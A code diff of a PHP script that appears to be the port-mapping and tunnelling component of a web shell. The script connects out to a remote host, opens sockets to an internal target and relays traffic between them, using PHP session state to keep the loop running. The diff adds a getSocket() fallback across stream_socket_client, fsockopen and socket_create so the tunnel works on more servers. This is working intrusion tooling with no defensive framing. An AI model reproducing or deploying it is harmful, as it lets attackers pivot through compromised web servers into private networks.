@@ -18,93 +18,62 @@ function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remo
 
             $read = array_merge($targets, $outers);
             $init = true;
-            while ($_SESSION["remoteRunning"]) {
+            while ($_SESSION["remoteRunning"]===true) {
 
                 if ($ready == false) {
 
-                    $outterSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-                    //socket_set_nonblock($outterSocket);
-                    $res = socket_connect($outterSocket, $remoteIP, intval($remotePort));
-                    if (!$res) {
-                        //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
-                    }
-                    socket_getsockname($outterSocket, $address, $port);
-                    $outers[$port] = $outterSocket;
-
-                    $outterSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-                    //socket_set_nonblock($outterSocket);
-                    $res = socket_connect($outterSocket, $remoteIP, intval($remotePort));
-                    if (!$res) {
-                        //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
-                    }
-                    socket_getsockname($outterSocket, $address, $port);
-                    $outers[$port] = $outterSocket;
-                    /*$targetSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-                    //socket_set_nonblock($targetSocket);
-                    $res = socket_connect($targetSocket, $targetIP, intval($targetPort));
-                    if (!$res) {
-                        //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
-                    }
-                    $targets[$port] = $targetSocket;
-                    if ($init) {
-                        $outterSocket_2 = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-                        //socket_set_nonblock($outterSocket_2);
-                        $res = socket_connect($outterSocket_2, $remoteIP, intval($remotePort));
-                        socket_getsockname($outterSocket_2, $address, $port);
-                        if (!$res) {
-                            //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
-                        }
-                        $outers[$port] = $outterSocket_2;
+                            $outtersocketObj = getSocket($remoteIP, $remotePort);
+                            $outterSocket = $outtersocketObj["s"];
+                            $s_type = $outtersocketObj["s_type"];
+                            $outers[intval($outterSocket)] = $outterSocket;
 
 
-                        $targetSocket_2 = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-                        //socket_set_nonblock($targetSocket_2);
-                        $res = socket_connect($targetSocket_2, $targetIP, intval($targetPort));
-                        if (!$res) {
-                            //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
-                        }
-                        $targets[$port] = $targetSocket_2;
-                    }
 
-                    $init = false;*/
-                    $ready = true;
+                            $socketRead = "socket_read";
+                            $socketWrite = "socket_write";
+                            $socketClose = "socket_close";
+                            $socketSelect = "socket_select";
+                            if ($s_type == 'stream') {
+                                $socketRead = "fread";
+                                $socketWrite = "fwrite";
+                                $socketClose = "fclose";
+                                $socketSelect = "stream_select";
+                            }
+                            $ready=true;
+
 
                 }
                 $read = array();
                 $read = array_merge($targets, $outers);
-                if (socket_select($read, $write, $exp, 0) > 0) {
+                if ($socketSelect($read, $write, $exp, 0) > 0) {
 
                     foreach ($read as $socket_item) {
                         if (in_array($socket_item, $outers)) {
 
-                            socket_getsockname($socket_item, $address, $key);
+                            $key = intval($socket_item);
                             if (isset($targets[$key])) {
-                                $content = socket_read($socket_item, 204800);
+                                $content = $socketRead($socket_item, 204800);
                                 if (strlen($content) > 0) {
-                                    socket_write($targets[$key], $content, strlen($content));
+                                    $socketWrite($targets[$key], $content, strlen($content));
                                 } else {
                                     $ready = false;
-                                    socket_close($socket_item);
-                                    socket_close($targets[$key]);
+                                    $socketClose($socket_item);
+                                    $socketClose($targets[$key]);
                                     unset($outers[$key]);
                                     unset($targets[$key]);
                                     continue;
                                 }
                             } else {
-                                $targetSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-                                //socket_set_nonblock($targetSocket);
-                                $res = socket_connect($targetSocket, $targetIP, intval($targetPort));
-                                if (!$res) {
-                                    //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
-                                }
+                                $targetSocketObj = getSocket($targetIP, $targetPort);
+                                $targetSocket = $targetSocketObj["s"];
                                 $targets[$key] = $targetSocket;
-                                $content = socket_read($socket_item, 204800);
+                                $content = $socketRead($socket_item, 204800);
                                 if (strlen($content) > 0) {
-                                    socket_write($targetSocket, $content, strlen($content));
+                                    $socketWrite($targetSocket, $content, strlen($content));
                                 } else {
                                     $ready = false;
-                                    socket_close($socket_item);
-                                    socket_close($targetSocket);
+                                    $socketClose($socket_item);
+                                    $socketClose($targetSocket);
                                     unset($outers[$key]);
                                     unset($targets[$key]);
                                     continue;
@@ -117,10 +86,10 @@ function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remo
                             foreach ($targets as $k => $v) {
                                 if ($socket_item == $v) {
                                     if (isset($outers[$k])) {
-                                        $content = socket_read($socket_item, 204800);
+                                        $content = $socketRead($socket_item, 204800);
 
                                         if (strlen($content) > 0) {
-                                            socket_write($outers[$k], $content, strlen($content));
+                                            $socketWrite($outers[$k], $content, strlen($content));
                                         } else {
 
                                             /*$ready = false;
@@ -133,7 +102,7 @@ function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remo
                                     } else {
 
 
-                                        socket_close($socket_item);
+                                        $socketClose($socket_item);
                                         unset($targets[$k]);
                                         $ready = false;
                                         continue;
@@ -160,17 +129,36 @@ function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remo
             }
             break;
         case "createLocal":
-            $localSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-            if ($localSocket === false) {
-                echo "\x37\x21\x49\x36Failed creating socket";
-                return;
-            }
-            $res = @socket_connect($localSocket, $targetIP, $targetPort);
-            if ($res === false) {
+
+            $localSocketObj=getSocket($targetIP,$targetPort);
+            $localSocket = $localSocketObj["s"];
+            $s_type = $localSocketObj["s_type"];
+            if ($s_type == 'error') {
                 echo "\x37\x21\x49\x36Failed connecting to target" . $targetIP . ":" . $targetPort;
                 return;
             }
-            socket_set_nonblock($localSocket);
+
+
+
+                                        $socketRead = "socket_read";
+                                        $socketWrite = "socket_write";
+                                        $socketClose = "socket_close";
+                                        $socketSelect = "socket_select";
+                                        if ($s_type == 'stream') {
+                                            $socketRead = "fread";
+                                            $socketWrite = "fwrite";
+                                            $socketClose = "fclose";
+                                            $socketSelect = "stream_select";
+                                        }
+            if ($s_type=='stream')
+            {
+                stream_set_blocking($localSocket,false );
+            }
+            else
+            {
+                socket_set_nonblock($localSocket);
+            }
+
             @session_start();
             $_SESSION["local_running".$socketHash] = true;
             $_SESSION["writebuf".$socketHash] = "";
@@ -194,7 +182,7 @@ function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remo
                 $_SESSION["localPortMapLock".$socketHash] = "false";
                 session_write_close();
                 if ($writeBuff != "") {
-                    $i = socket_write($localSocket, $writeBuff, strlen($writeBuff));
+                    $i = $socketWrite($localSocket, $writeBuff, strlen($writeBuff));
                     if ($i === false) {
                         @session_start();
                         $_SESSION["local_running".$socketHash] = false;
@@ -202,7 +190,7 @@ function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remo
                         echo "\x37\x21\x49\x36Failed writing socket";
                     }
                 }
-                while ($o = socket_read($localSocket, 20480)) {
+                while ($o = $socketRead($localSocket, 20480)) {
                     if ($o === false) {
                         @session_start();
                         $_SESSION["local_running".$socketHash] = false;
@@ -218,7 +206,7 @@ function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remo
                 }
                 #sleep(0.2);
             }
-            socket_close($localSocket);
+            $socketClose($localSocket);
             break;
         case "read":
 
@@ -309,4 +297,35 @@ function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remo
             session_write_close();
             break;
     }
+}
+function getSocket($ip, $port)
+{
+    $resultObj=array();
+    if (($f = 'stream_socket_client') && is_callable($f)) {
+        $s = $f("tcp://{$ip}:{$port}");
+        $s_type = 'stream';
+    }
+    if (!$s && ($f = 'fsockopen') && is_callable($f)) {
+        $s = $f($ip, $port);
+        $s_type = 'stream';
+    }
+    if (!$s && ($f = 'socket_create') && is_callable($f)) {
+        $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
+        $res = @socket_connect($s, $ip, $port);
+        if (!$res) {
+            die();
+        }
+        $s_type = 'socket';
+    }
+    if (!$s_type) {
+        $s_type="error";
+        $s='no socket funcs';
+    }
+    if (!$s) {
+        $s_type="error";
+        $s='no socket';
+    }
+    $resultObj["s"]=$s;
+    $resultObj["s_type"]=$s_type;
+    return $resultObj;
 }
